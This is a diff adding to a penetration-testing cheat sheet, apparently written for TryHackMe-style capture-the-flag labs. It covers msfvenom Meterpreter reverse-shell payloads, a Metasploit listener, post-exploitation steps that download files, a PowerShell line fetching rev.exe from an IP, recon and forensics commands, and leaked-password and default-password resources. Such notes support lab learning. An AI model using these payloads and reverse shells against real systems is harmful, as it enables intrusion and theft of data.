@@ -166,18 +166,32 @@ powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' 
 
 **WINDOWS**
 Payload
-`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o rev.exe`
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o rev.exe
+# or
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f vbs -o rev.vbs
+```
 
 Run Listener on the background
-```
+```bash
 meterpreter > background
 use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 10.10.10.10
 set LPORT 4443
 run -j
-```
 
+# things to do
+sessions -l
+session 1
+meterpreter > sysinfo
+meterpreter > run post/windows/manage/migrate
+meterpreter > search -f flag.txt
+meterpreter > download 'c:\Users\thm\Desktop\flag.txt'
+meterpreter > cat 'c:\Users\thm\Desktop\flag.txt'
+```
+> msf cheatsheet: https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/
+ 
 ### Netcat Listener
 
 **WINDOWS**
@@ -295,4 +309,82 @@ Here are some common options you can use with enum4linux:
 
 but for Simplicity just run this 
 enum4linux -a 10.10.10.10
+```
+
+
+## RECON
+### PASSSIVE RECON
+```bash
+#!/bin/bash
+
+rhost=tryhackme.com
+
+# Whois
+whois $rhost
+
+# DNS
+# can be used to return all the IPv4 addresses
+nslookup -type=A $rhost 1.1.1.1
+# learn about the email servers and configurations for a particular domain
+nslookup -type=MX $rhost
+# Lookup DNS TXT records	
+nslookup -type=TXT tryhackme.com
+
+# https://dnsdumpster.com/
+echo "[+] Continue Searching Here: https://dnsdumpster.com/ and https://www.shodan.io"
+```
+
+## Forensics
+
+### Networking
+**tcpdump**
+```bash
+network_interface=eth0
+# capture first 10 packets
+tcpdump -i $network_interface -c 10
+# Capture HTTP request
+tcpdump -i $network_interface 'port 80'
+```
+
+### FILES
+**strace**
+intercepts log and system calls made and signals received by a process
+```bash
+strace -e trace=file [command]
+```
+
+**lsof**
+```bash
+# finds processes using a directory
+lsof +D /path/to/directory
+```
+
+**grep**
+```bash
+grep "ERROR" /var/log
+```
+
+
+--- 
+## ONLINE TOOLS
+
+### PASSWORD ATTACKS
+
+Default Passwords:
+Here are some website lists that provide default passwords for various products.
+
+- https://cirt.net/passwords
+- https://default-password.info/ # example https://default-password.info/juniper/isg2000
+- https://datarecovery.com/rd/default-passwords/
+
+Leaked Passwords
+- https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases
+
+Username generator:
+```bash
+git clone https://github.com/therodri2/username_generator.git
+cd username_generator 
+python3 username_generator.py -h
+echo "John Smith" > users.lst
+python3 username_generator.py -w users.lst
 ```
